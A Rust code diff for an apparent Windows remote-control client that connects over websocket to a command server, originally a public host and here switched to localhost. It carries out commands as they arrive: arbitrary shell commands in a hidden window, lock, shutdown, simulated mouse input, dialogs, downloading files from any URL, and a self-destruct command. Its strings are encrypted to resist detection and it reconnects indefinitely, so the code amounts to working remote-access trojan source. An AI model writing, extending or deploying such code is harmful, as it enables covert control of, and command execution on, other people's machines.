@@ -10,15 +10,23 @@ use_litcrypt!();
 
 use std::{os::windows::{process::CommandExt}, pin::Pin, process::Command, time::Duration};
 use std::alloc::{alloc, Layout};
+use reqwest::header::HeaderValue;
 use windows::Win32::{Graphics::Gdi::{DEVMODE_DISPLAY_ORIENTATION, DMDO_180, DMDO_270, DMDO_90, DMDO_DEFAULT}, UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_MOUSE,  MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT}, WindowsAndMessaging::{SetCursorPos, MB_ICONEXCLAMATION}}};
 use async_trait::async_trait;
 use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame, WSError};
+use std::sync::{Mutex, Arc};
+use rand::distr::{Alphanumeric, SampleString};
+use std::fs;
 
 mod actions;
+mod logs;
 
 struct Client {
-    handle: ezsockets::Client<Self>
+    handle: ezsockets::Client<Self>,
+    acts: actions::Actions,
+    logger: Arc<Mutex<logs::DebugLogs>>
 }
+
 
 #[async_trait]
 impl ezsockets::ClientExt for Client {
@@ -60,17 +68,17 @@ impl ezsockets::ClientExt for Client {
         }
 
         if param == lc!("caps") {
-            actions::toggle_caps();
+            actions::Actions::toggle_caps();
             let _ = self.handle.text("ok");
         }
 
         if param == lc!("lock") {
-            actions::lock();
+            actions::Actions::lock();
             let _ = self.handle.text("ok");
         }
 
         if param == lc!("close") {
-            actions::alt_f4();
+            actions::Actions::alt_f4();
             let _ = self.handle.text("ok");
         }
 
@@ -81,11 +89,12 @@ impl ezsockets::ClientExt for Client {
 
         if param == lc!("command") {
             Command::new("cmd").args(["/C", val.as_str()]).creation_flags(0x08000000).spawn().unwrap();
+            let _ = self.handle.text(lc!("ok"));
         }
 
         if param == lc!("volume") {
             let percentage: u8 = val.parse().unwrap();
-            actions::set_volume(percentage);
+            self.acts.set_volume(percentage);
             let _ = self.handle.text("ok".to_string());
         }
 
@@ -98,19 +107,30 @@ impl ezsockets::ClientExt for Client {
                 "0" => rotation = DMDO_DEFAULT,
                 _ => rotation = DMDO_90
             }
-            actions::rotate_monitor(rotation);
+            self.acts.rotate_monitor(rotation);
 
             let _ = self.handle.text("ok");
         }
 
+        if param == lc!("logs") {
+            let mut logs = self.logger.lock().unwrap();
+            self.handle.text(logs.get_logs());
+        }
+
+        if param == lc!("clearlogs") {
+            let mut logs = self.logger.lock().unwrap();
+            logs.clear_logs();
+            self.handle.text("ok");
+        }
+
         if param == lc!("shutdown") {
-            actions::shutdown();
+            self.acts.shutdown();
             let _ = self.handle.text("ok");
         }
 
         if param == lc!("dialog") {
             let vals: Vec<String> = val.split(".,.").map(|s|s.to_string()).collect();
-            actions::dialog(vals[0].to_string(), vals.last().unwrap().to_string(), MB_ICONEXCLAMATION);
+            self.acts.dialog(vals[0].to_string(), vals.last().unwrap().to_string(), MB_ICONEXCLAMATION);
             let _ = self.handle.text("ok".to_string());
         }
 
@@ -120,7 +140,7 @@ impl ezsockets::ClientExt for Client {
                 let _ = self.handle.text(lc!("error=too_long"));
                 return Ok(());
             }
-            actions::beep(duration_ms);
+            self.acts.beep(duration_ms);
             let _ = self.handle.text("ok");
         }
 
@@ -135,6 +155,8 @@ impl ezsockets::ClientExt for Client {
                     }
                 }
             });
+
+            let _ = self.handle.text(lc!("ok"));
         }
 
         if param == lc!("destruct") {
@@ -142,7 +164,8 @@ impl ezsockets::ClientExt for Client {
         }
 
         if param == lc!("space") {
-            actions::space_bar();
+            actions::Actions::space_bar();
+            let _ = self.handle.text(lc!("ok"));
         }
 
         if param == lc!("m") {
@@ -172,11 +195,48 @@ impl ezsockets::ClientExt for Client {
                 let inputs = vec![click];
                 SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
             }
+
+            let _ = self.handle.text(lc!("ok"));
         }
 
         if param == lc!("wallpaper") {
-            let parts: Vec<String> = val.split(",").map(|s| s.to_string()).collect();
-            actions::change_wallpaper(parts[0].to_string());
+            let url = val.as_str();
+            let res = reqwest::get(url).await;
+            
+
+            if res.is_err() {
+                let mut logger = self.logger.lock().unwrap();
+                logger.error(lc!("Failed to fetch image"));
+
+                let _ = self.handle.text(lc!("error=res_failed"));
+                return Ok(())
+            }
+
+            let response = res.unwrap();
+
+            let mut file_ext = "image/png";
+
+            let file_ext_header = response.headers().get("Content-Type");
+            if let Some(ext) = file_ext_header {
+                file_ext = ext.to_str().unwrap_or("image/png").split("/").last().unwrap();
+            }
+
+            let file_name = Alphanumeric.sample_string(&mut rand::rng(), 8) + "." + file_ext;
+            let base_path = fs::canonicalize(std::env::var(lc!("TEMP")).unwrap()).unwrap().as_path().to_str().unwrap().to_owned().strip_prefix("\\\\?\\").unwrap().to_owned() + "\\" + &file_name;
+            println!("{}", base_path);
+
+            
+            let body = response.bytes().await.unwrap();
+            let result = fs::write(&base_path, body);
+
+            
+            if result.is_err() {
+                let mut logger = self.logger.lock().unwrap();
+                logger.error(lc!("Failed to save image"));
+            }
+
+            self.acts.change_wallpaper(base_path);
+            let _ = self.handle.text(lc!("ok"));
         }
 
         if param == lc!("lu") {
@@ -198,6 +258,7 @@ impl ezsockets::ClientExt for Client {
                 let inputs = vec![click];
                 SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
             }
+            let _ = self.handle.text(lc!("ok"));
         }
         
         Ok(())
@@ -242,14 +303,18 @@ impl ezsockets::ClientExt for Client {
 #[tokio::main]
 async fn main() {
     let mut builder = env_logger::Builder::new();
+    let mut logger = Arc::new(Mutex::new(logs::DebugLogs { lines: vec![] }));
+    let mut acts = actions::Actions { logger: Arc::clone(&logger) };
+
     builder.filter_level(log::LevelFilter::Debug).init();
 
-    let cfg = ClientConfig::new(lc!("ws://koti.frii.site:8099/ws").as_str());
-    let config = cfg.socket_config(ezsockets::SocketConfig { heartbeat: Duration::from_secs(3), timeout: Duration::from_secs(8), ..Default::default() })
-        .reconnect_interval(Duration::from_secs(3))
-        .max_reconnect_attempts(9999999);
 
-    let (_handle, future) = ezsockets::connect(|handle| Client { handle }, config).await;
+    let cfg = ClientConfig::new(lc!("ws://localhost:8099/ws").as_str());
+    let config = cfg.socket_config(ezsockets::SocketConfig { heartbeat: Duration::from_secs(3), timeout: Duration::from_secs(8), ..Default::default() })
+        .reconnect_interval(Duration::from_secs(6))
+        .max_reconnect_attempts(usize::MAX);
+
+    let (_handle, future) = ezsockets::connect(|handle| Client { handle, logger, acts }, config).await;
 
     future.await.unwrap();
 }
